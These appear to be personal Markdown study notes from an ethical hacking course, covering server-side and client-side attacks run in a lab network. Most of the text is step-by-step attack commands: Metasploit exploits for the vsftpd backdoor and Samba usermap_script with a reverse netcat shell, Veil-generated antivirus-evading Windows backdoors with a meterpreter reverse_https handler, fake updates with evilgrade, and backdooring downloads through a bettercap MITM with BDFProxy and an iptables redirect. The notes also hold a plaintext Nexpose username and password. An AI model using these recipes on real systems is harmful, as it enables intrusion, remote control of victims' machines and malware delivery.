# Server Side Attacks
## Information Gathering

### zenmap Intense Scan --> Google por open port services
### Look for misconfigurations, backdoors

## Metasploit Exploit
`msfconsole`
### Ftp port 21 vulnerability
`use exploit/unix/ftp/vsftpd_234_backdoor`
`set RHOST 10.0.2.5`
`exploit`

### Samba 3.X vuln. Let's us execute payloads on target computer (not linux cmds)
## bind: opens port so host machine can access victim's machine
## reverse: opens port on host machine so victim's machine connects to us. Bypasses firewalls.
`use exploit/multi/samba/usermap_script`
`set RHOST 10.0.2.5`
`set PAYLOAD cmd/unix/reverse_netcat`
`set LHOST 10.0.2.15` #host machine ip
`set LPORT 5555` #could be 80 so it goes through with no problem.
`exploit`

## Nexpose
### Discover, assess and act on vulns.
### Shows exploits published other than metasploit.
### Reports for tech + managers
### Periodic scans: weekly/monthly
username: ppwason
password: ppwason1!

Stop postgresql
`service postgresql stop`
`cd /opt/rapid7/nexpose/nsc`
`./nsc.sh`



# Client Side Attacks
## Information Gathering. Focused on the person
### Need to be the MITM
## Veil Framework. Undetectable Backdoors for Windows
## Always UPDATE VEIL. It updates its code to make better backdoors
`list`
### 2 tools: Evasion (generates backdoors) & Ordnance (generates payloads used by Evasion).
`use 1`
`list`
### Jerarqy of path: <program language>/<type of payload>/<method to establish connection>
go/meterpreter/rev_https.py: program language Go executed in meterpreter using a reverse https. Reverse = the connection is going the other way. The victim connects to the host.

This backdoor is only captured by AVG Antivirus
`cd /opt/Veil`
`./Veil.py`
	`list`
	`use 1`
	`list`
	`use 15`
	`set LHOST 10.0.2.15`
	`set LPORT 8080`
	`set PROCESSORS 1`
	`set SLEEP 6`
	`options`
	`generate`
This generates .exe

## Metasploit
### Open port 8080 on host machine to listen to the connection
`msfcondole`
	`use exploit/multi/handler`
	`show options`
	`set PAYLOAD windows/meterpreter/reverse_https`
	`set LHOST 10.0.2.15`
	`set LPORT 8080`
	`exploit`
To Test: In Windows, download it from the webserver of kali, execute and watch metasploit terminal.

## Hacking Windows 10 Using Fake Update
## WORKS ONLY ON HTTP

`cd /opt/evilgrade`
`./evilgrade`
	`show modules`
	`configure dap`
	`show options`
	`set agent /var/www/html/backdoor.exe`
	`set endsite`
	

## Backdooring Downloads on the Fly to Hack Windows 10
`cd /opt/BDFProxy`
`gedit bdfproxy.cfg`
	change ip in windows (both) to tell it to connect to host machine
`./bdf_proxy.py`
### Running Bettercap to be the MITM
`bettercap -iface eth0 -caplet spoof.cap`
### Redirecting traffic from bettercap to BDFProxy
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

`msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc`
Wait for connection

## How to avoid
### Avoid being MITM'ed
1. Xarp
2. HTTPS pages,
3. Check file MD5 after download


## Social Engineering
### Don't need to be the MITM
### Most important thing: Information Gathering
## Maltego


## Backdooring Any File Type
iconarchive.com 
rw-designer.com/image-to-icon
Using program Autoit, upload the .au3 file (downloaded from resource) and an icon. Convert and upload to webserver. Download in Windows and execute.

### Spoofing .exe Extension to Any Extensino (jpg,pdf,etc)




